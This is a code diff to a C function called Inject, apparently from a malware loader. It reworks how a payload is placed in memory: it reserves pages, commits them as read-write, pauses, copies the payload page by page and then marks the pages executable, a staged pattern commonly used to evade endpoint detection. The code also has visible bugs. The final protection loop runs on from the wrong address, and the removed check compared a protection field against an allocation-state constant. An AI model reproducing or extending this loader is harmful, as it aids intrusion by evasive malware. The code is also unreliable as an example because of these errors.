@@ -19,37 +19,47 @@ PVOID Inject(_In_ PVOID PayloadBuffer, _In_ SIZE_T PayloadSize)
 		return NULL;
 	}
 
-	DWORD					 NewSize = SET_TO_MULTIPLE_OF_4096(PayloadSize);
-	MEMORY_BASIC_INFORMATION MemoryBasicInformation;
-	PVOID					 StartAddress;
-	
-	Wait(FALSE);
-
-	for (StartAddress = NULL; VirtualQuery(StartAddress, &MemoryBasicInformation, sizeof(MEMORY_BASIC_INFORMATION));
-		StartAddress = (PVOID)((ULONG_PTR)StartAddress + MemoryBasicInformation.RegionSize))
-	{
-		if (MemoryBasicInformation.AllocationProtect == PAGE_EXECUTE_READWRITE
-			&& MemoryBasicInformation.Protect == MEM_RESERVE
-			&& MemoryBasicInformation.Type == MEM_PRIVATE
-			&& MemoryBasicInformation.RegionSize == NewSize)
-		{
-			break;
-		}
-	}
+	DWORD PaddedSize   = SET_TO_MULTIPLE_OF_4096(PayloadSize);
+	PVOID StartAddress = VirtualAlloc(NULL, PaddedSize + PAGE_SIZE, MEM_RESERVE, PAGE_READONLY);
 
 	if (StartAddress == NULL)
 	{
 		return NULL;
 	}
 
+	StartAddress      = (PVOID)((ULONG_PTR)StartAddress + PAGE_SIZE);
 	PVOID TempAddress = StartAddress;
 
-	for (DWORD i = 0; i < NewSize / PAGE_SIZE; i++)
+	for (DWORD i = 0; i <= PaddedSize / PAGE_SIZE; i++)
+	{
+		if (!VirtualAlloc(TempAddress, PAGE_SIZE, MEM_COMMIT, PAGE_READWRITE))
+		{
+			return NULL;
+		}
+		TempAddress = (PVOID)((ULONG_PTR)TempAddress + PAGE_SIZE);
+	}
+
+	Wait(FALSE);
+
+	TempAddress = StartAddress;
+
+	for (DWORD i = 0; i < PaddedSize / PAGE_SIZE; i++)
 	{	
-		_Memcpy(StartAddress, PayloadBuffer, PAGE_SIZE);
+		_Memcpy(TempAddress, PayloadBuffer, PAGE_SIZE);
 
 		PayloadBuffer = (PBYTE)((ULONG_PTR)PayloadBuffer + PAGE_SIZE);
-		TempAddress   = (PBYTE)((ULONG_PTR)StartAddress  + PAGE_SIZE);
+		TempAddress   = (PBYTE)((ULONG_PTR)TempAddress  + PAGE_SIZE);
+	}
+
+	DWORD OldProtection = 0;
+
+	for (DWORD i = 0; i <= PaddedSize / PAGE_SIZE; i++)
+	{
+		if (!VirtualProtect(TempAddress, PAGE_SIZE, PAGE_EXECUTE_READ, &OldProtection))
+		{
+			return NULL;
+		}
+		TempAddress = (PVOID)((ULONG_PTR)TempAddress + PAGE_SIZE);
 	}
 
 	return StartAddress;
